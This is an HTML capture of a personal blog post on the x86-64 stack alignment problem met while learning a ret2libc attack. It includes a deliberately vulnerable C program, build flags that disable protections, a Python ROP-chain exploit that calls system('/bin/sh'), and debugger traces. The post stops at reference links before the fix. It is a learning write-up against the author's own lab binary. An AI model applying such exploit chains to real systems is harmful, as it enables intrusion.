<!doctype html><html lang=en dir=auto><head><script src="/livereload.js?mindelay=10&amp;v=2&amp;port=35623&amp;path=livereload" data-no-instant defer></script><meta charset=utf-8><meta http-equiv=X-UA-Compatible content="IE=edge"><meta name=viewport content="width=device-width,initial-scale=1,shrink-to-fit=no"><meta name=robots content="index, follow"><title>The Stack allignment problem | Rahul Mishra</title>
<meta name=keywords content><meta name=description content="While learning about ret2libc exploitation, I encountered a stack alignment issue that initially confused me. After spending some time debugging, I finally understood why we add that extra ret instruct for the solution. I thought it would be valuable to share this insight with you all, in case it helps someone facing the same problem.
‍
Lets look at the memory layout
‍
Our key interest Right now, is the stack!"><meta name=author content="Me"><link rel=canonical href=//localhost:35623/blogs/stack-allignment-problem/><link crossorigin=anonymous href=/assets/css/stylesheet.fc220c15db4aef0318bbf30adc45d33d4d7c88deff3238b23eb255afdc472ca6.css integrity="sha256-/CIMFdtK7wMYu/MK3EXTPU18iN7/MjiyPrJVr9xHLKY=" rel="preload stylesheet" as=style><link rel=icon href=//localhost:35623/favicon.ico><link rel=icon type=image/png sizes=16x16 href=//localhost:35623/favicon-16x16.png><link rel=icon type=image/png sizes=32x32 href=//localhost:35623/favicon-32x32.png><link rel=apple-touch-icon href=//localhost:35623/apple-touch-icon.png><link rel=mask-icon href=//localhost:35623/safari-pinned-tab.svg><meta name=theme-color content="#2e2e33"><meta name=msapplication-TileColor content="#2e2e33"><link rel=alternate hreflang=en href=//localhost:35623/blogs/stack-allignment-problem/><noscript><style>#theme-toggle,.top-link{display:none}</style><style>@media(prefers-color-scheme:dark){:root{--theme:rgb(29, 30, 32);--entry:rgb(46, 46, 51);--primary:rgb(218, 218, 219);--secondary:rgb(155, 156, 157);--tertiary:rgb(65, 66, 68);--content:rgb(196, 196, 197);--code-block-bg:rgb(46, 46, 51);--code-bg:rgb(55, 56, 62);--border:rgb(51, 51, 51)}.list{background:var(--theme)}.list:not(.dark)::-webkit-scrollbar-track{background:0 0}.list:not(.dark)::-webkit-scrollbar-thumb{border-color:var(--theme)}}</style></noscript><meta property="og:title" content="The Stack allignment problem"><meta property="og:description" content="While learning about ret2libc exploitation, I encountered a stack alignment issue that initially confused me. After spending some time debugging, I finally understood why we add that extra ret instruct for the solution. I thought it would be valuable to share this insight with you all, in case it helps someone facing the same problem.
‍
Lets look at the memory layout
‍
Our key interest Right now, is the stack!"><meta property="og:type" content="article"><meta property="og:url" content="//localhost:35623/blogs/stack-allignment-problem/"><meta property="article:section" content="blogs"><meta property="article:published_time" content="2025-06-10T00:00:00+00:00"><meta property="article:modified_time" content="2025-06-10T00:00:00+00:00"><meta property="og:site_name" content="Rahul Mishra"><meta name=twitter:card content="summary"><meta name=twitter:title content="The Stack allignment problem"><meta name=twitter:description content="While learning about ret2libc exploitation, I encountered a stack alignment issue that initially confused me. After spending some time debugging, I finally understood why we add that extra ret instruct for the solution. I thought it would be valuable to share this insight with you all, in case it helps someone facing the same problem.
‍
Lets look at the memory layout
‍
Our key interest Right now, is the stack!"><script type=application/ld+json>{"@context":"https://schema.org","@type":"BreadcrumbList","itemListElement":[{"@type":"ListItem","position":1,"name":"Blogs","item":"//localhost:35623/blogs/"},{"@type":"ListItem","position":2,"name":"The Stack allignment problem","item":"//localhost:35623/blogs/stack-allignment-problem/"}]}</script><script type=application/ld+json>{"@context":"https://schema.org","@type":"BlogPosting","headline":"The Stack allignment problem","name":"The Stack allignment problem","description":"While learning about ret2libc exploitation, I encountered a stack alignment issue that initially confused me. After spending some time debugging, I finally understood why we add that extra ret instruct for the solution. I thought it would be valuable to share this insight with you all, in case it helps someone facing the same problem.\n‍\nLets look at the memory layout\n‍\nOur key interest Right now, is the stack!","keywords":[],"articleBody":"While learning about ret2libc exploitation, I encountered a stack alignment issue that initially confused me. After spending some time debugging, I finally understood why we add that extra ret instruct for the solution. I thought it would be valuable to share this insight with you all, in case it helps someone facing the same problem.\n‍\nLets look at the memory layout\n‍\nOur key interest Right now, is the stack!\nStack is a part of memory used for: Function calls (return addresses) Function arguments (sometimes if your function has more than 6 argument) Local variables ‍ The first 6 arguments are on the following Registers (RDI, RSI, RDX, RCX, R8, R9), rest of the arguments will get into Stack\nNow, you must be aware with buffer overflow and ret2libc attacks for proceeding further on this article.\n‍\n#include \u003cstdio.h\u003e #include \u003cstdlib.h\u003e // Vulnerable function void vuln_func() { char buffer[8]; // Small buffer (8 bytes) puts(\"The buffer is small now, enter some data:\"); //gets() is unsafe and causes buffer overflows. gets(buffer); } int main() { puts(\"Calling vulnerable function...\"); vuln_func(); return 0; } ‍\nall: gcc -no-pie -fno-stack-protector vulnerable.c -o vulnerable -D_FORTIFY_SOURCE=0 -std=c99 clean: rm -f vulnerablee This compiles your vulnerable.c​​ file with exploitation-friendly settings\n‍\n+-------------------------------------------------------------+ | GCC Compilation Flags | +------------------------+------------------------------------+ | Flag | Description | +------------------------+------------------------------------+ | -no-pie | Disables PIE (Position-Independent | | | Executable). | | | Ensures fixed memory addresses in | | | the binary (e.g., main, puts). | +------------------------+------------------------------------+ | -fno-stack-protector | Disables stack canary protection. | | | Allows buffer overflows without | | | detection. | +------------------------+------------------------------------+ | -D_FORTIFY_SOURCE=0 | Turns off extra glibc checks for | | | functions like gets(), strcpy(). | | | Prevents automatic abort on unsafe | | | operations. | +------------------------+------------------------------------+ | -std=c99 | Compiles using C99 standard. | | | Ensures compatibility and better | | | behavior in modern compilers. | +------------------------+------------------------------------+ | -z execstack (missing) | This flag is NOT included here. | | | It would allow execution on stack | | | (needed for shellcode sometimes). | | | This binary has non-executable | | | stack (default in modern Linux). | +------------------------+------------------------------------+ ‍\n‍\nFile: exploit.py ─────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────── 1 │ import struct 2 │ libc_base = 0x7ffff7da9000 3 │ payload = b\"A\" * 8 # offset to rbp 4 │ payload += b\"B\" * 8 # rbp 5 │ payload += struct.pack(\"","wordCount":"1425","inLanguage":"en","datePublished":"2025-06-10T00:00:00Z","dateModified":"2025-06-10T00:00:00Z","author":{"@type":"Person","name":"Me"},"mainEntityOfPage":{"@type":"WebPage","@id":"//localhost:35623/blogs/stack-allignment-problem/"},"publisher":{"@type":"Organization","name":"Rahul Mishra","logo":{"@type":"ImageObject","url":"//localhost:35623/favicon.ico"}}}</script></head><body id=top><script>localStorage.getItem("pref-theme")==="dark"?document.body.classList.add("dark"):localStorage.getItem("pref-theme")==="light"?document.body.classList.remove("dark"):window.matchMedia("(prefers-color-scheme: dark)").matches&&document.body.classList.add("dark")</script><header class=header><nav class=nav><div class=logo><a href=//localhost:35623/ accesskey=h title="Home (Alt + H)"><img src=//localhost:35623/apple-touch-icon.png alt aria-label=logo height=35>Home</a><div class=logo-switches><button id=theme-toggle accesskey=t title="(Alt + T)"><svg id="moon" width="24" height="18" viewBox="0 0 24 24" fill="none" stroke="currentcolor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round"><path d="M21 12.79A9 9 0 1111.21 3 7 7 0 0021 12.79z"/></svg><svg id="sun" width="24" height="18" viewBox="0 0 24 24" fill="none" stroke="currentcolor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round"><circle cx="12" cy="12" r="5"/><line x1="12" y1="1" x2="12" y2="3"/><line x1="12" y1="21" x2="12" y2="23"/><line x1="4.22" y1="4.22" x2="5.64" y2="5.64"/><line x1="18.36" y1="18.36" x2="19.78" y2="19.78"/><line x1="1" y1="12" x2="3" y2="12"/><line x1="21" y1="12" x2="23" y2="12"/><line x1="4.22" y1="19.78" x2="5.64" y2="18.36"/><line x1="18.36" y1="5.64" x2="19.78" y2="4.22"/></svg></button></div></div><ul id=menu><li><a href=//localhost:35623/blogs/ title=blogs><span>blogs</span></a></li><li><a href=//localhost:35623/projects/ title=projects><span>projects</span></a></li></ul></nav></header><main class=main><article class=post-single><header class=post-header><div class=breadcrumbs><a href=//localhost:35623/>Home</a>&nbsp;»&nbsp;<a href=//localhost:35623/blogs/>Blogs</a></div><h1 class="post-title entry-hint-parent">The Stack allignment problem</h1><div class=post-meta><span title='2025-06-10 00:00:00 +0000 UTC'>June 10, 2025</span>&nbsp;·&nbsp;7 min&nbsp;·&nbsp;1425 words&nbsp;·&nbsp;Me&nbsp;|&nbsp;<a href=https://github.com/%3cpath_to_repo%3e/content/blogs/stack-allignment-problem.md rel="noopener noreferrer" target=_blank>Suggest Changes</a></div></header><div class=post-content><p>While learning about ret2libc exploitation, I encountered a stack alignment issue that initially confused me. After spending some time debugging, I finally understood why we add that extra ret instruct for the solution. I thought it would be valuable to share this insight with you all, in case it helps someone facing the same problem.</p><p>‍</p><p><strong>Lets look at the memory layout</strong></p><p><img alt=image loading=lazy src=/blogs/the-stack-allignment-problem/image-20250615121128-wuoskjb.png></p><p>‍</p><p><strong>Our key interest Right now, is the stack!</strong></p><h3 id=stack-is-a-part-of-memory-used-for>Stack is a part of memory used for:<a hidden class=anchor aria-hidden=true href=#stack-is-a-part-of-memory-used-for>#</a></h3><ul><li><strong>Function calls</strong> (return addresses)</li><li><strong>Function arguments</strong> (sometimes if your function has more than 6 argument)</li><li><strong>Local variables</strong></li><li>‍</li></ul><blockquote><p>The first 6 arguments are on the following Registers (RDI, RSI, RDX, RCX, R8, R9), rest of the arguments will get into Stack</p></blockquote><p><img alt=image loading=lazy src=/blogs/the-stack-allignment-problem/image-20250613132559-dtky5o7.png></p><p>Now, you must be aware with buffer overflow and ret2libc attacks for proceeding further on this article.</p><p>‍</p><div class=highlight><pre tabindex=0 class=chroma><code class=language-mathematica data-lang=mathematica><span class=line><span class=cl><span class=nv>#</span><span class=n>include</span><span class=w> </span><span class=o>&lt;</span><span class=n>stdio</span><span class=err>.</span><span class=n>h</span><span class=o>&gt;</span><span class=w>
</span></span></span><span class=line><span class=cl><span class=w></span><span class=nv>#</span><span class=n>include</span><span class=w> </span><span class=o>&lt;</span><span class=n>stdlib</span><span class=err>.</span><span class=n>h</span><span class=o>&gt;</span><span class=w>
</span></span></span><span class=line><span class=cl><span class=w>
</span></span></span><span class=line><span class=cl><span class=w></span><span class=o>//</span><span class=w> </span><span class=n>Vulnerable</span><span class=w> </span><span class=n>function</span><span class=w>
</span></span></span><span class=line><span class=cl><span class=w></span><span class=n>void</span><span class=w> </span><span class=nv>vuln_func</span><span class=p>()</span><span class=w> </span><span class=p>{</span><span class=w>
</span></span></span><span class=line><span class=cl><span class=w>    </span><span class=n>char</span><span class=w> </span><span class=n>buffer</span><span class=p>[</span><span class=mi>8</span><span class=p>];</span><span class=w>  </span><span class=o>//</span><span class=w> </span><span class=n>Small</span><span class=w> </span><span class=n>buffer</span><span class=w> </span><span class=p>(</span><span class=mi>8</span><span class=w> </span><span class=n>bytes</span><span class=p>)</span><span class=w>
</span></span></span><span class=line><span class=cl><span class=w>
</span></span></span><span class=line><span class=cl><span class=w>    </span><span class=n>puts</span><span class=p>(</span><span class=s>&#34;The buffer is small now, enter some data:&#34;</span><span class=p>);</span><span class=w>
</span></span></span><span class=line><span class=cl><span class=w>
</span></span></span><span class=line><span class=cl><span class=w>     </span><span class=o>//</span><span class=n>gets</span><span class=p>()</span><span class=w> </span><span class=n>is</span><span class=w> </span><span class=n>unsafe</span><span class=w> </span><span class=n>and</span><span class=w> </span><span class=n>causes</span><span class=w> </span><span class=n>buffer</span><span class=w> </span><span class=n>overflows</span><span class=err>.</span><span class=w>
</span></span></span><span class=line><span class=cl><span class=w>    </span><span class=n>gets</span><span class=p>(</span><span class=n>buffer</span><span class=p>);</span><span class=w>
</span></span></span><span class=line><span class=cl><span class=w></span><span class=p>}</span><span class=w>
</span></span></span><span class=line><span class=cl><span class=w>
</span></span></span><span class=line><span class=cl><span class=w></span><span class=n>int</span><span class=w> </span><span class=n>main</span><span class=p>()</span><span class=w> </span><span class=p>{</span><span class=w>
</span></span></span><span class=line><span class=cl><span class=w>    </span><span class=n>puts</span><span class=p>(</span><span class=s>&#34;Calling vulnerable function...&#34;</span><span class=p>);</span><span class=w>
</span></span></span><span class=line><span class=cl><span class=w>    </span><span class=nv>vuln_func</span><span class=p>();</span><span class=w>
</span></span></span><span class=line><span class=cl><span class=w>
</span></span></span><span class=line><span class=cl><span class=w>    </span><span class=n>return</span><span class=w> </span><span class=mi>0</span><span class=p>;</span><span class=w>
</span></span></span><span class=line><span class=cl><span class=w></span><span class=p>}</span><span class=w>
</span></span></span></code></pre></div><p>‍</p><div class=highlight><pre tabindex=0 class=chroma><code class=language-makefile data-lang=makefile><span class=line><span class=cl><span class=nf>all</span><span class=o>:</span>
</span></span><span class=line><span class=cl>	gcc -no-pie -fno-stack-protector vulnerable.c -o vulnerable  -D_FORTIFY_SOURCE<span class=o>=</span><span class=m>0</span>  -std<span class=o>=</span>c99 
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl><span class=nf>clean</span><span class=o>:</span>
</span></span><span class=line><span class=cl>	rm -f vulnerablee
</span></span></code></pre></div><p>This compiles your <code>vulnerable.c</code>​​ file with <strong>exploitation-friendly settings</strong></p><p>‍</p><div class=highlight><pre tabindex=0 class=chroma><code class=language-mathematica data-lang=mathematica><span class=line><span class=cl><span class=o>+-------------------------------------------------------------+</span><span class=w>
</span></span></span><span class=line><span class=cl><span class=w></span><span class=o>|</span><span class=w>                  </span><span class=n>GCC</span><span class=w> </span><span class=n>Compilation</span><span class=w> </span><span class=n>Flags</span><span class=w>                      </span><span class=o>|</span><span class=w>
</span></span></span><span class=line><span class=cl><span class=w></span><span class=o>+------------------------+------------------------------------+</span><span class=w>
</span></span></span><span class=line><span class=cl><span class=w></span><span class=o>|</span><span class=w>        </span><span class=n>Flag</span><span class=w>            </span><span class=o>|</span><span class=w>            </span><span class=n>Description</span><span class=w>             </span><span class=o>|</span><span class=w>
</span></span></span><span class=line><span class=cl><span class=w></span><span class=o>+------------------------+------------------------------------+</span><span class=w>
</span></span></span><span class=line><span class=cl><span class=w></span><span class=o>|</span><span class=w> </span><span class=o>-</span><span class=n>no</span><span class=o>-</span><span class=n>pie</span><span class=w>                </span><span class=o>|</span><span class=w> </span><span class=n>Disables</span><span class=w> </span><span class=n>PIE</span><span class=w> </span><span class=p>(</span><span class=n>Position</span><span class=o>-</span><span class=n>Independent</span><span class=w> </span><span class=o>|</span><span class=w>
</span></span></span><span class=line><span class=cl><span class=w></span><span class=o>|</span><span class=w>                        </span><span class=o>|</span><span class=w> </span><span class=n>Executable</span><span class=p>)</span><span class=err>.</span><span class=w>                       </span><span class=o>|</span><span class=w>
</span></span></span><span class=line><span class=cl><span class=w></span><span class=o>|</span><span class=w>                        </span><span class=o>|</span><span class=w> </span><span class=n>Ensures</span><span class=w> </span><span class=n>fixed</span><span class=w> </span><span class=n>memory</span><span class=w> </span><span class=n>addresses</span><span class=w> </span><span class=n>in</span><span class=w>  </span><span class=o>|</span><span class=w>
</span></span></span><span class=line><span class=cl><span class=w></span><span class=o>|</span><span class=w>                        </span><span class=o>|</span><span class=w> </span><span class=n>the</span><span class=w> </span><span class=n>binary</span><span class=w> </span><span class=p>(</span><span class=n>e</span><span class=err>.</span><span class=n>g</span><span class=err>.</span><span class=p>,</span><span class=w> </span><span class=n>main</span><span class=p>,</span><span class=w> </span><span class=n>puts</span><span class=p>)</span><span class=err>.</span><span class=w>     </span><span class=o>|</span><span class=w>
</span></span></span><span class=line><span class=cl><span class=w></span><span class=o>+------------------------+------------------------------------+</span><span class=w>
</span></span></span><span class=line><span class=cl><span class=w></span><span class=o>|</span><span class=w> </span><span class=o>-</span><span class=n>fno</span><span class=o>-</span><span class=n>stack</span><span class=o>-</span><span class=n>protector</span><span class=w>   </span><span class=o>|</span><span class=w> </span><span class=n>Disables</span><span class=w> </span><span class=n>stack</span><span class=w> </span><span class=n>canary</span><span class=w> </span><span class=n>protection</span><span class=err>.</span><span class=w>  </span><span class=o>|</span><span class=w>
</span></span></span><span class=line><span class=cl><span class=w></span><span class=o>|</span><span class=w>                        </span><span class=o>|</span><span class=w> </span><span class=n>Allows</span><span class=w> </span><span class=n>buffer</span><span class=w> </span><span class=n>overflows</span><span class=w> </span><span class=n>without</span><span class=w>    </span><span class=o>|</span><span class=w>
</span></span></span><span class=line><span class=cl><span class=w></span><span class=o>|</span><span class=w>                        </span><span class=o>|</span><span class=w> </span><span class=n>detection</span><span class=err>.</span><span class=w>                         </span><span class=o>|</span><span class=w>
</span></span></span><span class=line><span class=cl><span class=w></span><span class=o>+------------------------+------------------------------------+</span><span class=w>
</span></span></span><span class=line><span class=cl><span class=w></span><span class=o>|</span><span class=w> </span><span class=o>-</span><span class=nv>D_FORTIFY_SOURCE</span><span class=o>=</span><span class=mi>0</span><span class=w>    </span><span class=o>|</span><span class=w> </span><span class=n>Turns</span><span class=w> </span><span class=n>off</span><span class=w> </span><span class=n>extra</span><span class=w> </span><span class=n>glibc</span><span class=w> </span><span class=n>checks</span><span class=w> </span><span class=n>for</span><span class=w>   </span><span class=o>|</span><span class=w>
</span></span></span><span class=line><span class=cl><span class=w></span><span class=o>|</span><span class=w>                        </span><span class=o>|</span><span class=w> </span><span class=n>functions</span><span class=w> </span><span class=n>like</span><span class=w> </span><span class=n>gets</span><span class=p>(),</span><span class=w> </span><span class=n>strcpy</span><span class=p>()</span><span class=err>.</span><span class=w>   </span><span class=o>|</span><span class=w>
</span></span></span><span class=line><span class=cl><span class=w></span><span class=o>|</span><span class=w>                        </span><span class=o>|</span><span class=w> </span><span class=n>Prevents</span><span class=w> </span><span class=n>automatic</span><span class=w> </span><span class=n>abort</span><span class=w> </span><span class=n>on</span><span class=w> </span><span class=n>unsafe</span><span class=w> </span><span class=o>|</span><span class=w>
</span></span></span><span class=line><span class=cl><span class=w></span><span class=o>|</span><span class=w>                        </span><span class=o>|</span><span class=w> </span><span class=n>operations</span><span class=err>.</span><span class=w>                        </span><span class=o>|</span><span class=w>
</span></span></span><span class=line><span class=cl><span class=w></span><span class=o>+------------------------+------------------------------------+</span><span class=w>
</span></span></span><span class=line><span class=cl><span class=w></span><span class=o>|</span><span class=w> </span><span class=o>-</span><span class=n>std</span><span class=o>=</span><span class=n>c99</span><span class=w>               </span><span class=o>|</span><span class=w> </span><span class=n>Compiles</span><span class=w> </span><span class=n>using</span><span class=w> </span><span class=n>C99</span><span class=w> </span><span class=n>standard</span><span class=err>.</span><span class=w>       </span><span class=o>|</span><span class=w>
</span></span></span><span class=line><span class=cl><span class=w></span><span class=o>|</span><span class=w>                        </span><span class=o>|</span><span class=w> </span><span class=n>Ensures</span><span class=w> </span><span class=n>compatibility</span><span class=w> </span><span class=n>and</span><span class=w> </span><span class=n>better</span><span class=w>   </span><span class=o>|</span><span class=w>
</span></span></span><span class=line><span class=cl><span class=w></span><span class=o>|</span><span class=w>                        </span><span class=o>|</span><span class=w> </span><span class=n>behavior</span><span class=w> </span><span class=n>in</span><span class=w> </span><span class=n>modern</span><span class=w> </span><span class=n>compilers</span><span class=err>.</span><span class=w>      </span><span class=o>|</span><span class=w>
</span></span></span><span class=line><span class=cl><span class=w></span><span class=o>+------------------------+------------------------------------+</span><span class=w>
</span></span></span><span class=line><span class=cl><span class=w></span><span class=o>|</span><span class=w> </span><span class=o>-</span><span class=n>z</span><span class=w> </span><span class=n>execstack</span><span class=w> </span><span class=p>(</span><span class=n>missing</span><span class=p>)</span><span class=w> </span><span class=o>|</span><span class=w> </span><span class=n>This</span><span class=w> </span><span class=n>flag</span><span class=w> </span><span class=n>is</span><span class=w> </span><span class=n>NOT</span><span class=w> </span><span class=n>included</span><span class=w> </span><span class=n>here</span><span class=err>.</span><span class=w>    </span><span class=o>|</span><span class=w>
</span></span></span><span class=line><span class=cl><span class=w></span><span class=o>|</span><span class=w>                        </span><span class=o>|</span><span class=w> </span><span class=n>It</span><span class=w> </span><span class=n>would</span><span class=w> </span><span class=n>allow</span><span class=w> </span><span class=n>execution</span><span class=w> </span><span class=n>on</span><span class=w> </span><span class=n>stack</span><span class=w>  </span><span class=o>|</span><span class=w>
</span></span></span><span class=line><span class=cl><span class=w></span><span class=o>|</span><span class=w>                        </span><span class=o>|</span><span class=w> </span><span class=p>(</span><span class=n>needed</span><span class=w> </span><span class=n>for</span><span class=w> </span><span class=n>shellcode</span><span class=w> </span><span class=n>sometimes</span><span class=p>)</span><span class=err>.</span><span class=w>  </span><span class=o>|</span><span class=w>
</span></span></span><span class=line><span class=cl><span class=w></span><span class=o>|</span><span class=w>                        </span><span class=o>|</span><span class=w> </span><span class=n>This</span><span class=w> </span><span class=n>binary</span><span class=w> </span><span class=n>has</span><span class=w> </span><span class=n>non</span><span class=o>-</span><span class=n>executable</span><span class=w>     </span><span class=o>|</span><span class=w>
</span></span></span><span class=line><span class=cl><span class=w></span><span class=o>|</span><span class=w>                        </span><span class=o>|</span><span class=w> </span><span class=n>stack</span><span class=w> </span><span class=p>(</span><span class=n>default</span><span class=w> </span><span class=n>in</span><span class=w> </span><span class=n>modern</span><span class=w> </span><span class=n>Linux</span><span class=p>)</span><span class=err>.</span><span class=w>   </span><span class=o>|</span><span class=w>
</span></span></span><span class=line><span class=cl><span class=w></span><span class=o>+------------------------+------------------------------------+</span><span class=w>
</span></span></span></code></pre></div><p>‍</p><p><img alt=image loading=lazy src=/blogs/the-stack-allignment-problem/image-20250619001922-4gid30k.png></p><p>‍</p><pre tabindex=0><code class=language-pgsql data-lang=pgsql> File: exploit.py

───────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────
   1   │ import struct
   2   │ libc_base = 0x7ffff7da9000
   3   │ payload = b&#34;A&#34; * 8                                           # offset to rbp 
   4   │ payload += b&#34;B&#34; * 8                                          # rbp
   5   │ payload += struct.pack(&#34;&lt;Q&#34;, libc_base + 0x000000000002a145) # pop rdi; ret;
   6   │ payload += struct.pack(&#34;&lt;Q&#34;, 0x7ffff7f50ea4)                 # address of /bin/sh
   7   │ payload += struct.pack(&#34;&lt;Q&#34;, 0x7ffff7dfc110)                 # address of System function() 
   8   │ payload += struct.pack(&#34;&lt;Q&#34;, 0x7ffff7deb340)                 # address of exit function
   9   │ 
  10   │ #we are using option &lt;Q&gt;, because we want to convert these 64 bit addresses to little endian format
  11   │ 
  12   │ 
  13   │ # print(payload)
  14   │ with open(&#34;exploit1&#34;, &#34;wb&#34;) as f:
  15   │     f.write(payload)
  16   │ 
  17   │ print(&#34;Payload written to exploit1. Run with: `./vulnerable_program &lt; input.txt`&#34;)
</code></pre><p>‍</p><p>This is the exploit I wrote while performing a <strong>ret2libc attack</strong>. The goal is to call the <code>system()</code>​​ function with <code>"/bin/sh"</code>​​ as its argument in order to spawn a shell. To do this, we use a <strong>ROP gadget</strong> — specifically <code>pop rdi; ret</code>​​ — which is used to load the address of the <code>"/bin/sh"</code>​​ string into the <strong>RDI register</strong>, as required by the x86-64 calling convention (where the first function argument is passed via RDI).</p><p>After setting up the argument, we place the address of the system() function in the chain, which will be executed next. Finally, we include the address of the exit function so that once system returns, the program exits cleanly without crashing.</p><p>‍</p><p>‍</p><div class=highlight><pre tabindex=0 class=chroma><code class=language-mathematica data-lang=mathematica><span class=line><span class=cl><span class=n>pwndbg</span><span class=o>&gt;</span><span class=w> </span><span class=n>disassemble</span><span class=w> </span><span class=nv>vuln_func</span><span class=w>
</span></span></span></code></pre></div><p>‍</p><p><img alt=image loading=lazy src=/blogs/the-stack-allignment-problem/image-20250614151815-v4quv7t.png></p><div class=highlight><pre tabindex=0 class=chroma><code class=language-mathematica data-lang=mathematica><span class=line><span class=cl><span class=n>pwndbg</span><span class=o>&gt;</span><span class=w> </span><span class=n>break</span><span class=w> </span><span class=o>*</span><span class=mi>0</span><span class=n>x000000000040115b</span><span class=w>
</span></span></span><span class=line><span class=cl><span class=w>             </span><span class=n>or</span><span class=w>
</span></span></span><span class=line><span class=cl><span class=w></span><span class=n>pwndbg</span><span class=o>&gt;</span><span class=w> </span><span class=n>break</span><span class=w> </span><span class=o>*</span><span class=nv>vuln_func</span><span class=w> </span><span class=o>+</span><span class=w> </span><span class=mi>37</span><span class=w>
</span></span></span></code></pre></div><p>‍</p><p>run the binary with the exploit we wrote above.</p><p><img alt=image loading=lazy src=/blogs/the-stack-allignment-problem/image-20250614152132-n21cfu0.png></p><p>‍</p><p>We hit the Brekpoint</p><p><img alt=image loading=lazy src=/blogs/the-stack-allignment-problem/image-20250614150240-ualnstw.png></p><p>‍</p><p>The stack looks perfect</p><div class=highlight><pre tabindex=0 class=chroma><code class=language-mathematica data-lang=mathematica><span class=line><span class=cl><span class=err>────────────────────────────────────────────────────────────────────</span><span class=p>[</span><span class=w> </span><span class=n>STACK</span><span class=w> </span><span class=p>]</span><span class=err>────────────────────────────────────────────────────────────────────</span><span class=w>
</span></span></span><span class=line><span class=cl><span class=w></span><span class=mi>00</span><span class=err>:</span><span class=mi>0000</span><span class=err>│</span><span class=w> </span><span class=n>rsp</span><span class=w> </span><span class=mi>0</span><span class=n>x7fffffffdc28</span><span class=w> </span><span class=err>—▸</span><span class=w> </span><span class=mi>0</span><span class=n>x7ffff7dd3145</span><span class=w> </span><span class=p>(</span><span class=n>iconv</span><span class=o>+</span><span class=mi>181</span><span class=p>)</span><span class=w> </span><span class=err>◂—</span><span class=w> </span><span class=n>pop</span><span class=w> </span><span class=n>rdi</span><span class=w>
</span></span></span><span class=line><span class=cl><span class=w></span><span class=mi>01</span><span class=err>:</span><span class=mi>0008</span><span class=err>│</span><span class=w>     </span><span class=mi>0</span><span class=n>x7fffffffdc30</span><span class=w> </span><span class=err>—▸</span><span class=w> </span><span class=mi>0</span><span class=n>x7ffff7f50ea4</span><span class=w> </span><span class=err>◂—</span><span class=w> </span><span class=mi>0</span><span class=n>x68732f6e69622f</span><span class=w> </span><span class=o>/*</span><span class=w> </span><span class=err>&#39;</span><span class=o>/</span><span class=n>bin</span><span class=o>/</span><span class=n>sh</span><span class=err>&#39;</span><span class=w> </span><span class=o>*/</span><span class=w>
</span></span></span><span class=line><span class=cl><span class=w></span><span class=mi>02</span><span class=err>:</span><span class=mi>0010</span><span class=err>│</span><span class=w>     </span><span class=mi>0</span><span class=n>x7fffffffdc38</span><span class=w> </span><span class=err>—▸</span><span class=w> </span><span class=mi>0</span><span class=n>x7ffff7dfc110</span><span class=w> </span><span class=p>(</span><span class=n>system</span><span class=p>)</span><span class=w> </span><span class=err>◂—</span><span class=w> </span><span class=n>test</span><span class=w> </span><span class=n>rdi</span><span class=p>,</span><span class=w> </span><span class=n>rdi</span><span class=w>
</span></span></span><span class=line><span class=cl><span class=w></span><span class=mi>03</span><span class=err>:</span><span class=mi>0018</span><span class=err>│</span><span class=w>     </span><span class=mi>0</span><span class=n>x7fffffffdc40</span><span class=w> </span><span class=err>—▸</span><span class=w> </span><span class=mi>0</span><span class=n>x7ffff7deb340</span><span class=w> </span><span class=p>(</span><span class=n>exit</span><span class=p>)</span><span class=w> </span><span class=err>◂—</span><span class=w> </span><span class=n>sub</span><span class=w> </span><span class=n>rsp</span><span class=p>,</span><span class=w> </span><span class=mi>8</span><span class=w>
</span></span></span></code></pre></div><p>‍</p><p><strong>Stack diagram</strong></p><pre tabindex=0><code class=language-pgsql data-lang=pgsql>               ┌────────────────────────────────────────────┐
  High addr →  │       &#34;AAAA AAAA&#34; (8‑byte padding)         │
               ├────────────────────────────────────────────┤
               │       &#34;BBBB BBBB&#34; (fake saved RBP)         │
               ├────────────────────────────────────────────┤
               │     0x7fffffffdc28 →  pop rdi ; ret (libc) │  ← first RET jumps here
               ├────────────────────────────────────────────┤
               │    0x7fffffffdc30 →  &#34;/bin/sh&#34; string      │  ← popped into RDI
               ├────────────────────────────────────────────┤
               │    0x7fffffffdc38 →  system()              │  ← second RET jumps here
               ├────────────────────────────────────────────┤
               │    0x7fffffffdc40 →  exit()                │  ← system() returns here
  Low  addr →  └────────────────────────────────────────────┘
</code></pre><p>‍</p><p>I had some glitch in pwndbg, so i have shifted to gef.</p><p><img alt=image loading=lazy src=/blogs/the-stack-allignment-problem/image-20250614153331-p3b5nam.png></p><p>‍</p><p><img alt=image loading=lazy src=/blogs/the-stack-allignment-problem/image-20250614153614-vox7o3o.png></p><p>‍</p><pre tabindex=0><code class=language-pgsql data-lang=pgsql>rdi: 0x00007ffff7f50ea4  →  0x0068732f6e69622f (&#34;/bin/sh&#34;?)
</code></pre><p><img alt=image loading=lazy src=/blogs/the-stack-allignment-problem/image-20250614153727-ga806ic.png></p><p>‍</p><p><strong>Calling System Function</strong></p><p><img alt=image loading=lazy src=/blogs/the-stack-allignment-problem/image-20250614154120-15gnfac.png></p><pre tabindex=0><code class=language-pgsql data-lang=pgsql>$rip   : 0x00007ffff7dfc110  →  &lt;system+0000&gt; test rdi, rdi
</code></pre><p>‍</p><p>‍</p><p><img alt=image loading=lazy src=/blogs/the-stack-allignment-problem/image-20250614154156-fbg1crx.png></p><p>‍</p><p><strong>Everything was fine until we got this</strong></p><p><img alt=image loading=lazy src=/blogs/the-stack-allignment-problem/image-20250614154401-sc849tw.png></p><pre tabindex=0><code class=language-pgsql data-lang=pgsql> ► 0x7ffff7dfbdf4 &lt;do_system+356&gt;    movaps xmmword ptr [rsp + 0x50], xmm0     &lt;[0x7fffffffd8e8] not aligned to 16 bytes&gt;
</code></pre><p>‍</p><p>I saw some of the articles on internet talking about this issue, I am sharing those here for your reference:</p><pre tabindex=0><code class=language-ascii data-lang=ascii>https://security.stackexchange.com/questions/278592/ret2libc-exploit-not-working-but-it-seems-correct-in-gdb#:~:text=There%20is%20a%20great%20chance,stack%20may%20not%20aligned%20propertly

https://c9x.me/compile/doc/abi.html#:~:text=The%20ABI%20is%20unclear%20on,0%20mod%2016

https://stackoverflow.com/questions/67243284/why-movaps-causes-segmentation-fault#:~:text=%3E%20MOVAPS%E2%80%94Move%20Aligned%20Packed%20Single,GP%29%20will%20be%20generated
